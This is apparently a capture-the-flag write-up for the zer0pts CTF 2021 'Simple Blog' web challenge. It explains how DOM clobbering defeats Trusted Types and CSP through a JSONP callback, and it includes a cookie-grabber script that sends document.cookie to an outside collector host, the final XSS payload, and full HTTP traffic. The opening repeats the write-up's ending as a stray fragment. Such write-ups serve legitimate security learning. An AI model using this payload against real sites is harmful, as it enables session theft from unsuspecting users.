* `/cookie/` that will be called by the cookie grabber script to exfiltrate cookies.

The cookie grabber script is the following. You have to set `Content-Type: application/javascript`.

```javascript
document.location='https://<REDACTED>.free.beeceptor.com/cookie/'+btoa(document.cookie)
```

So the final payload to submit is the following.

```html
theme=dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=x href=https://<REDACTED>.free.beeceptor.com/evil/></a><a id=callback href=//%250Ajsonp(x);></a><""
```

Under the `/cookie/` endpoint you will find the base64 encoded cookies with the flag.

![endpoints.png](endpoints.png)

```
ZmxhZz16ZXIwcHRzezFfdzRudF90MF9lNHRfZDBtX2QwbV9oNG1idXJnZXJfczBtZWQ0eX0=
```

Decoding it.

```
flag=zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
```","# zer0pts CTF 2021 – Simple Blog

* **Category:** web
* **Points:** 192

## Challenge

> Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?
> 
> http://web.ctf.zer0pts.com:8003/
> 
> author:st98

## Solution

The challenge gives you an [attachment](simple_blog_1bfee2f68d1fbeec74729e11cae31aab.tar.gz) containing the source code. The most important files are [`index.php`](simple_blog/web/www/index.php) and [`api.php`](simple_blog/web/www/api.php).

Analyzing the website, you can discover the following message under the ""Report Vulnerability"" section.

> If you find a vulnerability in my blog platform, please report a Proof of Concept that exfiltrates document.cookie to me. I will check the URL with Mozilla Firefox later.
> 
> I only accept reports under /index.php, so please submit only GET paremeters. For example, if the URL you want to submit is http://example.com/index.php?theme=light, please submit only theme=light part.

So, given this message and the challenge description, it's pretty obvious that the target of the challenge is to exploit some sort of *Reflected XSS*.

The website allows the possibility to change the theme via a URL parameter.

Passing a value for the `theme` parameter will reflect the passed value in some parts of the webpage.

```
GET /?theme=foo HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:17:41 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 2957
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-foo.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-foo bg-foo"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""DZ5mzla/D4n5wZNlTB5qQwurzU4="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""DZ5mzla/D4n5wZNlTB5qQwurzU4="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

You can pass a `callback` parameter to the [`api.php`](simple_blog/web/www/api.php) endpoint and the method will be reflected into the output. The length limit is 20 chars.

```
GET /api.php?callback=foo HTTP/1.1
Host: web.ctf.zer0pts.com:8003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: */*
Referer: http://web.ctf.zer0pts.com:8003/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:08:52 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 569
Connection: close
Content-Type: application/javascript

foo([{""id"":1,""title"":""Hello, world!"",""content"":""Welcome to my blog platform!""},{""id"":2,""title"":""Lorem ipsum"",""content"":""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.""}])
```

Theoretically, the following payload would give an XSS, but it is blocked by the CSP.

```
GET /?theme=dark.min.css""><script>alert()</script>< HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:19:19 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 3065
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-dark.min.css""><script>alert()</script><.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-dark.min.css""><script>alert()</script>< bg-dark.min.css""><script>alert()</script><"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""gGLouNdYKt4a0tKHwIOwMDc9Giw="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""gGLouNdYKt4a0tKHwIOwMDc9Giw="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

The CSP is the following (defined in the `meta` tag of [`index.php`](simple_blog/web/www/index.php)) and it can't be bypassed easily.

```
default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default
```

First of all: you have to use Firefox for your testing phase, because the admin will use that browser.

The most important part of [`index.php`](simple_blog/web/www/index.php) is the following JavaScript.

```javascript
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
```

The process works as follow:
1. a [`trusted-types`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types) policy is created;
2. the `jsonp` method is invoked;
3. the `jsonp` method calls [`api.php`](simple_blog/web/www/api.php) passing the content of `window.callback`, if specified;
4. [`api.php`](simple_blog/web/www/api.php) returns a JavaScript snippet that will be included in the webpage and it will be executed, because it is considered ""safe"" for all defined policies;
5. the default method that will be executed is the `render` one, that will print blog posts into the page.

As a consequence, if it is possible to define `window.callback` you can execute an arbitrary JavaScript payload.

This can be achieved with a technique called [*DOM clobbering*](https://portswigger.net/web-security/dom-based/dom-clobbering). With this technique, the `window.callback` can be the reference to an HTML object with `id=""callback""`, so a payload like the following can be used.

```
GET /?theme=dark.min.css%22%3E%3Cdiv+id=%22callback%22%3Efoo%3C/div%3E%3C HTTP/1.1
Host: web.ctf.zer0pts.com:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 01:33:35 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 3077
Connection: close
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html lang=""en"">
  <head>
    <meta charset=""utf-8"">
    <title>Simple Blog</title>
    <meta http-equiv=""Content-Security-Policy"" content=""default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-uA0mbXM3XN0qqrr9Ln1E26ka/tE=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default"">
    <link rel=""stylesheet"" href=""/css/bootstrap-dark.min.css""><div id=""callback"">foo</div><.min.css"">
    <link rel=""stylesheet"" href=""/css/style.css"">
  </head>
  <body>
    <div class=""container"">
      <nav class=""navbar navbar-expand-lg navbar-dark.min.css""><div id=""callback"">foo</div>< bg-dark.min.css""><div id=""callback"">foo</div><"">
        <a class=""navbar-brand"" href=""/"">Simple Blog</a>
        <ul class=""navbar-nav mr-auto"">
          <li class=""nav-item""><a class=""nav-link"" href=""/report.php"">Report Vulnerability</a></li>
        </ul>
        <ul class=""navbar-nav"">
          <li class=""nav-item""><a class=""nav-link"" href=""/?theme=dark"">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class=""container"" id=""main"">
      <div class=""spinner-border"" id=""loading"">
        <span class=""sr-only"">Loading...</span>
      </div>
    </main>
    <script src=""/js/trustedtypes.build.js"" nonce=""uA0mbXM3XN0qqrr9Ln1E26ka/tE="" data-csp=""require-trusted-types-for 'script'; trusted-types default""></script>
    <script nonce=""uA0mbXM3XN0qqrr9Ln1E26ka/tE="">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

But this will trigger the error: `custom callback is unimplemented`. That happens because, in the CSP, there is the definition of `default` trusted type which is defined in the `init()` JavaScript function in the page.

![custom_callback_error.png](custom_callback_error.png)

The *DOM clobbering* technique can help you again. Here some references that can be useful to understand how it works:
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* [https://portswigger.net/research/dom-clobbering-strikes-back](https://portswigger.net/research/dom-clobbering-strikes-back)
* [https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94](https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94)
* [https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41](https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41)

The first step is to inject via *DOM clobbering* a `trustedType` object in order to override the one provided by the library. An exception will be thrown and the `catch` in the `init()` method will be reached. To bypass the `if` clause inside the `catch`, it is sufficient to use again the *DOM clobbering*, using a payload like the following.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><""
```

Now you can call the the api.php endpoint specifying a callback. A payload like the following can give a basic XSS.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=callback href=//%250Aalert();></a><""
```

Beacause the result request will be the following.

```
GET /api.php?callback=//%0Aalert(); HTTP/1.1
Host: web.ctf.zer0pts.com:8003
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://web.ctf.zer0pts.com:8003/?theme=dark.min.css%22%3E%3Cform%20id=trustedTypes%3E%3Coutput%20id=defaultPolicy%3Etrue%3C/output%3E%3C/form%3E%3Ca%20id=callback%20href=//%250Aalert();%3E%3C/a%3E%3C%22

HTTP/1.1 200 OK
Date: Sat, 06 Mar 2021 14:03:22 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Vary: Accept-Encoding
Content-Length: 577
Connection: close
Content-Type: application/javascript

//
alert();([{""id"":1,""title"":""Hello, world!"",""content"":""Welcome to my blog platform!""},{""id"":2,""title"":""Lorem ipsum"",""content"":""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.""}])
```

You can use `jsonp` method itself to perform cross-origin request, getting the URL via *DOM clobbering* to bypass the maximum length.

```html
dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=x href=https://<REDACTED>.free.beeceptor.com/></a><a id=callback href=//%250Ajsonp(x);></a><""
```

Analyzing the final webpage after the request, you can discover that with `jsonp` method the response of the cross-origin call is included in the page source and treated like an allowed JavaScript.

![remote_script.png](remote_script.png)

So you can create two endpoints:
* `/evil/` that will be called by the `jsonp` method and will return a cookie grabber script;
* `/cookie/` that will be called by the cookie grabber script to exfiltrate cookies.

The cookie grabber script is the following. You have to set `Content-Type: application/javascript`.

```javascript
document.location='https://<REDACTED>.free.beeceptor.com/cookie/'+btoa(document.cookie)
```

So the final payload to submit is the following.

```html
theme=dark.min.css""><form id=trustedTypes><output id=defaultPolicy>true</output></form><a id=x href=https://<REDACTED>.free.beeceptor.com/evil/></a><a id=callback href=//%250Ajsonp(x);></a><""
```

Under the `/cookie/` endpoint you will find the base64 encoded cookies with the flag.

![endpoints.png](endpoints.png)

```
ZmxhZz16ZXIwcHRzezFfdzRudF90MF9lNHRfZDBtX2QwbV9oNG1idXJnZXJfczBtZWQ0eX0=
```

Decoding it.

```
flag=zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
```"
